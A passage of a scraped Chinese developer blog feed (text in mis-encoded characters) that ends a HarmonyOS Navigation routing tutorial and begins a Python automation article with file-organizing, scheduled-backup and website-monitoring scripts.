  willShow: (from: NavDestinationContext | NavBar, to: NavDestinationContext | NavBar,
       operation: NavigationOperation, isAnimated: boolean) =&gt; {
         if (typeof to === "string") return; 
         if (to.pathInfo.name === "dialogPage") {
           to.pathStack.pop();
           to.pathStack.pushPath({ name: "page1", param: "bbbb" })
         }
       }
  })
}
</code></pre>
<h3 data-id="heading-21">2.5  è·¨åŒ…åŠ¨æ€è·¯ç”±-ç³»ç»Ÿè·¯ç”±è¡¨</h3>
<h4 data-id="heading-22">å‡†å¤‡ç”ŸæˆNavigationçš„route_mapè·¯ç”±</h4>
<p>aï¼‰ç»™æ¨¡å—åˆ›å»ºç³»ç»Ÿè·¯ç”±è¡¨ ï¼ˆä¹Ÿå°±æ˜¯é’ˆå¯¹äºNavigationä»¥åè¿˜æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶ç”Ÿæˆè·¯ç”±ï¼‰</p>
<p>åˆ›å»ºresources/base/profile/route_map.jsonï¼ˆ<code>åˆ‡è®°routeä¸åŠ r</code>ï¼‰è·¯ç”±é…ç½®æ–‡ä»¶ï¼Œå¡«å†™ä¸‹è¿°ä»£ç </p>
<pre><code class="hljs language-plain" lang="plain">{
  "routerMap": [
    {
      # è·¯ç”±å  ä¹Ÿå°±æ˜¯è·³è½¬å
      "name": "Homeæˆ–è€…Profile",    
      # æ”¹åå­—å¯¹åº”çš„é¡µé¢ 
      "pageSourceFile": "src/main/ets/pages/Profile.ets",     
      
      # åˆ‡è®°MainPage.etsè¿™ä¸ªæ–‡ä»¶å¿…é¡»ç”¨MainPageBuilderå½“åšå…¥å£ï¼ˆæ¯”è¾ƒæŠ½è±¡è·Ÿç€å†™  å†™å®Œåè¿‡æ¥çœ‹æ‰èƒ½ç†è§£ï¼‰
      "buildFunction": "MainPageBuilder",    
      "data": {
        "description" : "this is PageOne"
      }
    }
  ]
}
</code></pre>
<p>bï¼‰è®©åˆ›å»ºroute_map.jsonç”Ÿæ•ˆ ä¹Ÿå°±æ˜¯è·Ÿæ¨¡å—ç»‘å®š</p>
<p>ä¿®æ”¹æ¨¡å—çš„<code>module.json5</code>æ–‡ä»¶ <code>"routerMap": "$profile:route_map",</code></p>
<pre><code class="hljs language-plain" lang="plain">{
  "module": {
  
    "routerMap": "$profile:route_map",
    
    "name": "cartHar",
    "type": "har",
    "deviceTypes": [
      "default",
      "tablet",
      "2in1"
    ]
  }
}
</code></pre>
<h4 data-id="heading-23">åç»­åˆ›å»ºé¡µé¢è·³è½¬</h4>
<p>aï¼‰å¿…é¡»æŒ‰ç…§ä¸‹è¿°æ ¼å¼åˆ›å»ºé¡µé¢</p>
<pre><code class="hljs language-scss" lang="scss">æŒ‰ç…§ç³»ç»Ÿè·¯ç”±è¡¨éœ€è¦çš„ç»„ä»¶æ ¼å¼ä¿®æ”¹ç»„ä»¶ `<span class="hljs-attribute">src</span>/<span class="hljs-selector-tag">main</span>/ets/components/MainPage<span class="hljs-selector-class">.ets</span>`

```plain
<span class="hljs-comment">// è·³è½¬é¡µé¢å…¥å£å‡½æ•°</span>
<span class="hljs-keyword">@Builder</span>
export function MainPageBuilder() {  <span class="hljs-comment">// ç»†èŠ‚2ï¼šæŒ‰ç…§è¿™ä¸ªæ ¼å¼é…ç½®</span>
  <span class="hljs-built_in">MainPage</span>()
}


<span class="hljs-keyword">@Component</span>
struct MainPage { <span class="hljs-comment">// ç»†èŠ‚1.1ï¼šä¸ç”¨å¯¼å‡º  ä½†æ˜¯å¿…é¡»æŒ‰ç…§ä¸Šè¿°é…ç½®</span>

  <span class="hljs-built_in">build</span>() {
    <span class="hljs-built_in">NavDestination</span>() { <span class="hljs-comment">// ç»†èŠ‚1.2ï¼šå¿…é¡»é€šè¿‡NavDestinationå†™</span>
      Text('å†…å®¹')<span class="hljs-selector-class">.fontSize</span>(<span class="hljs-number">30</span>)
    }
    <span class="hljs-selector-class">.title</span>('CartHar/MainPage')
    <span class="hljs-selector-class">.hideTitleBar</span>(false)
  }
}
```


</code></pre>
<p>bï¼‰é€šè¿‡NavPathStackè·³è½¬</p>
<h3 data-id="heading-24">2.6  è·¨åŒ…åŠ¨æ€è·¯ç”±-è‡ªå®šä¹‰è·¯ç”±è¡¨ HMRouter</h3>
<p>åƒé”‹ç”Ÿé²œé¡¹ç›®</p>
<h3 data-id="heading-25">2.7  ä¼ä¸šçº§é¢è¯•é¢˜</h3>
<ul>
<li>Navigation å’Œ Router åŒºåˆ«</li>
</ul>

<pre><code class="hljs">1 è·¯ç”±æœ‰é—ªå±çš„é—®é¢˜ã€Navigationæ›´æµç•…
2 Navigationæ›´é€‚åˆä¸€æ¬¡å¼€å‘ã€å¤šç«¯é€‚é…
3 Navigationé¡µé¢è½¬åœºåŠ¨ç”»æ›´æ–¹ä¾¿
4 è·¨æ¨¡å—å¼€å‘Navigationæ›´æ–¹ä¾¿
ç­‰ç­‰
</code></pre>
<ul>
<li>å¦‚ä½•ç”¨çš„</li>
</ul>

<pre><code class="hljs language-diff" lang="diff">ä¼ ç»Ÿï¼š1-åˆ›å»ºé¡µé¢ã€2-é…ç½®è·¯ç”±main_pagesã€3-routerè·³è½¬
ç°åœ¨ï¼š
<span class="hljs-deletion">- å‡†å¤‡ï¼šNavigationåŠ¨æ€è·¯ç”±-ç³»ç»Ÿè·¯ç”±è¡¨é…ç½®ï¼š1-åˆ›å»ºroute_map.jsonå†™é…ç½®ã€2-æ³¨å†ŒæŠŠ1çš„æ–‡ä»¶è·Ÿé¡¹ç›®å…³è”module.json5ã€3-å…¥å£æ–‡ä»¶Navigationé…ç½®</span>
<span class="hljs-deletion">- åç»­1ï¼šåˆ›å»ºé¡µé¢  å¿…é¡»æŒ‰ç…§ç³»ç»Ÿè·¯ç”±è§„åˆ™å»åˆ›å»º ï¼ˆå¿…é¡»å†™NavDestination ç„¶åä¸å†™å¯¼å‡ºä½†æ˜¯å¿…é¡»è¢«@Builderè°ƒç”¨ï¼‰</span>
<span class="hljs-deletion">- åç»­2ï¼šé…ç½®è¯¥é¡µé¢è·¯ç”±å°±å¯ä»¥è·³è½¬</span>
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2F0a0a956faec348ddaa9b2676a3f19545%3Ftype%3D1%3Fha_source%3Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/0a0a956faec348ddaa9b2676a3f19545?type=1?ha_source=hmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">é¸¿è’™å¼€å‘ç­çº§</a></p>
<p>âœ¨å®¶äººä»¬ç‚¹ä¸ªjuejinè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<p>âœ¨å®¶äººä»¬ç‚¹ä¸ªjuejinè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<p>âœ¨å®¶äººä»¬ç‚¹ä¸ªjuejinè´¦å·å…³æ³¨ï¼Œä¼šæŒç»­å‘å¸ƒå¤§å‰ç«¯é¢†åŸŸæŠ€æœ¯æ–‡ç« ğŸ’• ğŸƒ</p>
<p>Â  Â  ^_^ ç‚¹å…³æ³¨ã€ä¸è¿·è·¯ã€ä¸»æ’­å¸¦ä½ å­¦æŠ€æœ¯ (à¹‘â€²á´—â€µà¹‘)ï¼© Láµ’áµ›áµ‰áµ§â‚’áµ¤â¤</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonè‡ªåŠ¨åŒ–è„šæœ¬ï¼šå‘Šåˆ«é‡å¤åŠ³åŠ¨]]></title>    <link>https://juejin.cn/post/7576861477267177491</link>    <guid>https://juejin.cn/post/7576861477267177491</guid>    <pubDate>2025-11-26T16:11:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576861477267177491" data-draft-id="7576888607479840787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonè‡ªåŠ¨åŒ–è„šæœ¬ï¼šå‘Šåˆ«é‡å¤åŠ³åŠ¨"/> <meta itemprop="keywords" content="Python,PyCharm"/> <meta itemprop="datePublished" content="2025-11-26T16:11:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BBBåŠªåŠ›å­¦ä¹ ç¨‹åºè®¾è®¡"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonè‡ªåŠ¨åŒ–è„šæœ¬ï¼šå‘Šåˆ«é‡å¤åŠ³åŠ¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BBBåŠªåŠ›å­¦ä¹ ç¨‹åºè®¾è®¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-26T16:11:18.000Z" title="Wed Nov 26 2025 16:11:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-26
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦æ›¾ç»èŠ±è´¹æ•°å°æ—¶é‡å¤åšç€ç›¸åŒçš„æ–‡ä»¶æ•´ç†ã€æ•°æ®å½•å…¥æˆ–ç³»ç»Ÿç»´æŠ¤å·¥ä½œï¼Ÿæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœè¿™äº›ç¹çä»»åŠ¡éƒ½èƒ½è‡ªåŠ¨å®Œæˆï¼Œä½ çš„å·¥ä½œæ•ˆç‡å°†æå‡å¤šå°‘å€ï¼Pythonè‡ªåŠ¨åŒ–è„šæœ¬æ­£æ˜¯ä¸ºæ­¤è€Œç”Ÿï¼Œå®ƒå°±åƒé›‡ä½£äº†ä¸€ä¸ªä¸çŸ¥ç–²å€¦çš„æ•°å­—åŠ©æ‰‹ï¼Œå¸®ä½ å¤„ç†å„ç§é‡å¤æ€§å·¥ä½œã€‚</p>
<h2 data-id="heading-0">å®æˆ˜ä»£ç ï¼šæ„å»ºä¸ªäººè‡ªåŠ¨åŒ–å·¥å…·ç®±</h2>
<h3 data-id="heading-1">æ–‡ä»¶æ‰¹é‡å¤„ç†è„šæœ¬</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> shutil
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">def</span> <span class="hljs-title function_">organize_files_by_extension</span>(<span class="hljs-params">folder_path</span>):
    <span class="hljs-string">"""
    æŒ‰æ–‡ä»¶æ‰©å±•åè‡ªåŠ¨æ•´ç†æ–‡ä»¶å¤¹
    """</span>
    <span class="hljs-comment"># ç¡®ä¿ç›®æ ‡æ–‡ä»¶å¤¹å­˜åœ¨</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(folder_path):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ï¼šæ–‡ä»¶å¤¹ <span class="hljs-subst">{folder_path}</span> ä¸å­˜åœ¨"</span>)
        <span class="hljs-keyword">return</span>
    
    <span class="hljs-comment"># å®šä¹‰æ–‡ä»¶ç±»å‹åˆ†ç±»</span>
    file_categories = {
        <span class="hljs-string">'å›¾ç‰‡'</span>: [<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.jpeg'</span>, <span class="hljs-string">'.png'</span>, <span class="hljs-string">'.gif'</span>, <span class="hljs-string">'.bmp'</span>],
        <span class="hljs-string">'æ–‡æ¡£'</span>: [<span class="hljs-string">'.pdf'</span>, <span class="hljs-string">'.doc'</span>, <span class="hljs-string">'.docx'</span>, <span class="hljs-string">'.txt'</span>, <span class="hljs-string">'.xlsx'</span>, <span class="hljs-string">'.pptx'</span>],
        <span class="hljs-string">'è§†é¢‘'</span>: [<span class="hljs-string">'.mp4'</span>, <span class="hljs-string">'.avi'</span>, <span class="hljs-string">'.mov'</span>, <span class="hljs-string">'.mkv'</span>],
        <span class="hljs-string">'éŸ³é¢‘'</span>: [<span class="hljs-string">'.mp3'</span>, <span class="hljs-string">'.wav'</span>, <span class="hljs-string">'.flac'</span>],
        <span class="hljs-string">'ä»£ç '</span>: [<span class="hljs-string">'.py'</span>, <span class="hljs-string">'.js'</span>, <span class="hljs-string">'.html'</span>, <span class="hljs-string">'.css'</span>, <span class="hljs-string">'.java'</span>],
        <span class="hljs-string">'å‹ç¼©åŒ…'</span>: [<span class="hljs-string">'.zip'</span>, <span class="hljs-string">'.rar'</span>, <span class="hljs-string">'.7z'</span>]
    }
    
    <span class="hljs-comment"># åˆ›å»ºåˆ†ç±»æ–‡ä»¶å¤¹</span>
    <span class="hljs-keyword">for</span> category <span class="hljs-keyword">in</span> file_categories.keys():
        category_path = os.path.join(folder_path, category)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(category_path):
            os.makedirs(category_path)
    
    <span class="hljs-comment"># éå†å¹¶æ•´ç†æ–‡ä»¶</span>
    moved_files = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        
        <span class="hljs-comment"># è·³è¿‡æ–‡ä»¶å¤¹å’Œéšè—æ–‡ä»¶</span>
        <span class="hljs-keyword">if</span> os.path.isdir(file_path) <span class="hljs-keyword">or</span> filename.startswith(<span class="hljs-string">'.'</span>):
            <span class="hljs-keyword">continue</span>
        
        <span class="hljs-comment"># è·å–æ–‡ä»¶æ‰©å±•å</span>
        _, file_extension = os.path.splitext(filename)
        file_extension = file_extension.lower()
        
        <span class="hljs-comment"># æŸ¥æ‰¾å¯¹åº”çš„æ–‡ä»¶åˆ†ç±»</span>
        moved = <span class="hljs-literal">False</span>
        <span class="hljs-keyword">for</span> category, extensions <span class="hljs-keyword">in</span> file_categories.items():
            <span class="hljs-keyword">if</span> file_extension <span class="hljs-keyword">in</span> extensions:
                target_path = os.path.join(folder_path, category, filename)
                shutil.move(file_path, target_path)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç§»åŠ¨: <span class="hljs-subst">{filename}</span> -&gt; <span class="hljs-subst">{category}</span>/"</span>)
                moved_files += <span class="hljs-number">1</span>
                moved = <span class="hljs-literal">True</span>
                <span class="hljs-keyword">break</span>
        
        <span class="hljs-comment"># æœªåˆ†ç±»çš„æ–‡ä»¶ç§»åˆ°"å…¶ä»–"æ–‡ä»¶å¤¹</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> moved:
            other_path = os.path.join(folder_path, <span class="hljs-string">"å…¶ä»–"</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(other_path):
                os.makedirs(other_path)
            shutil.move(file_path, os.path.join(other_path, filename))
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç§»åŠ¨: <span class="hljs-subst">{filename}</span> -&gt; å…¶ä»–/"</span>)
            moved_files += <span class="hljs-number">1</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næ•´ç†å®Œæˆï¼å…±ç§»åŠ¨äº† <span class="hljs-subst">{moved_files}</span> ä¸ªæ–‡ä»¶"</span>)

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
organize_files_by_extension(<span class="hljs-string">"/Users/ä½ çš„ç”¨æˆ·å/Downloads"</span>)
</code></pre>
<h3 data-id="heading-2">è‡ªåŠ¨å¤‡ä»½è„šæœ¬</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> shutil
<span class="hljs-keyword">import</span> schedule
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_backup</span>(<span class="hljs-params">source_dir, backup_dir</span>):
    <span class="hljs-string">"""
    åˆ›å»ºæ–‡ä»¶å¤‡ä»½
    """</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å¤¹</span>
        timestamp = datetime.now().strftime(<span class="hljs-string">"%Y%m%d_%H%M%S"</span>)
        backup_path = os.path.join(backup_dir, <span class="hljs-string">f"backup_<span class="hljs-subst">{timestamp}</span>"</span>)
        
        <span class="hljs-comment"># å¤åˆ¶æ–‡ä»¶</span>
        <span class="hljs-keyword">if</span> os.path.exists(source_dir):
            shutil.copytree(source_dir, backup_path)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤‡ä»½æˆåŠŸ: <span class="hljs-subst">{backup_path}</span>"</span>)
            <span class="hljs-keyword">return</span> backup_path
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ï¼šæºç›®å½• <span class="hljs-subst">{source_dir}</span> ä¸å­˜åœ¨"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
            
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤‡ä»½å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup_old_backups</span>(<span class="hljs-params">backup_dir, keep_days=<span class="hljs-number">7</span></span>):
    <span class="hljs-string">"""
    æ¸…ç†æ—§çš„å¤‡ä»½æ–‡ä»¶
    """</span>
    current_time = time.time()
    deleted_count = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> os.listdir(backup_dir):
        item_path = os.path.join(backup_dir, item)
        
        <span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æ˜¯å¤‡ä»½æ–‡ä»¶å¤¹ä¸”è¶…è¿‡ä¿ç•™æœŸé™</span>
        <span class="hljs-keyword">if</span> os.path.isdir(item_path) <span class="hljs-keyword">and</span> item.startswith(<span class="hljs-string">"backup_"</span>):
            <span class="hljs-comment"># è·å–æ–‡ä»¶å¤¹åˆ›å»ºæ—¶é—´</span>
            creation_time = os.path.getctime(item_path)
            age_days = (current_time - creation_time) / (<span class="hljs-number">24</span> * <span class="hljs-number">3600</span>)
            
            <span class="hljs-keyword">if</span> age_days &gt; keep_days:
                shutil.rmtree(item_path)
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åˆ é™¤æ—§å¤‡ä»½: <span class="hljs-subst">{item}</span>"</span>)
                deleted_count += <span class="hljs-number">1</span>
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¸…ç†å®Œæˆï¼åˆ é™¤äº† <span class="hljs-subst">{deleted_count}</span> ä¸ªæ—§å¤‡ä»½"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_auto_backup</span>(<span class="hljs-params">source_dir, backup_dir, interval_hours=<span class="hljs-number">24</span></span>):
    <span class="hljs-string">"""
    è®¾ç½®è‡ªåŠ¨å¤‡ä»½ä»»åŠ¡
    """</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">backup_job</span>():
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næ‰§è¡Œè‡ªåŠ¨å¤‡ä»½ - <span class="hljs-subst">{datetime.now()}</span>"</span>)
        create_backup(source_dir, backup_dir)
        cleanup_old_backups(backup_dir)
    
    <span class="hljs-comment"># è®¾ç½®å®šæ—¶ä»»åŠ¡</span>
    schedule.every(interval_hours).hours.do(backup_job)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è‡ªåŠ¨å¤‡ä»½å·²è®¾ç½®ï¼šæ¯<span class="hljs-subst">{interval_hours}</span>å°æ—¶å¤‡ä»½ä¸€æ¬¡"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æºç›®å½•: <span class="hljs-subst">{source_dir}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¤‡ä»½ç›®å½•: <span class="hljs-subst">{backup_dir}</span>"</span>)
    
    <span class="hljs-comment"># ç«‹å³æ‰§è¡Œä¸€æ¬¡å¤‡ä»½</span>
    backup_job()
    
    <span class="hljs-comment"># ä¿æŒç¨‹åºè¿è¡Œï¼ˆåœ¨å®é™…ä½¿ç”¨ä¸­å¯èƒ½éœ€è¦ç”¨ç³»ç»ŸæœåŠ¡ä»£æ›¿ï¼‰</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
            schedule.run_pending()
            time.sleep(<span class="hljs-number">60</span>)  <span class="hljs-comment"># æ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡</span>
    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nè‡ªåŠ¨å¤‡ä»½å·²åœæ­¢"</span>)

<span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹ï¼ˆå–æ¶ˆæ³¨é‡Šæ¥è¿è¡Œï¼‰</span>
<span class="hljs-comment"># setup_auto_backup(</span>
<span class="hljs-comment">#     source_dir="/Users/ä½ çš„ç”¨æˆ·å/é‡è¦æ–‡æ¡£",</span>
<span class="hljs-comment">#     backup_dir="/Users/ä½ çš„ç”¨æˆ·å/æ–‡æ¡£å¤‡ä»½",</span>
<span class="hljs-comment">#     interval_hours=24</span>
<span class="hljs-comment"># )</span>
</code></pre>
<h3 data-id="heading-3">ç½‘é¡µå†…å®¹ç›‘æ§è„šæœ¬</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> smtplib
<span class="hljs-keyword">from</span> email.mime.text <span class="hljs-keyword">import</span> MIMEText
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WebsiteMonitor</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, websites, check_interval=<span class="hljs-number">300</span></span>):
        <span class="hljs-string">"""
        åˆå§‹åŒ–ç½‘ç«™ç›‘æ§å™¨
        websites: è¦ç›‘æ§çš„ç½‘ç«™åˆ—è¡¨ [{'name': 'ç½‘ç«™å', 'url': 'ç½‘å€'}]
        check_interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """</span>
        self.websites = websites
        self.check_interval = check_interval
        self.status_history = {}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_website_status</span>(<span class="hljs-params">self, url</span>):
        <span class="hljs-string">"""
        æ£€æŸ¥ç½‘ç«™çŠ¶æ€
        """</span>
        <span class="hljs-keyword">try</span>:
            response = requests.get(url, timeout=<span class="hljs-number">10</span>)
            <span class="hljs-keyword">return</span> response.status_code == <span class="hljs-number">200</span>, response.status_code
        <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-built_in">str</span>(e)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_alert</span>(<span class="hljs-params">self, website_name, status, message</span>):
        <span class="hljs-string">"""
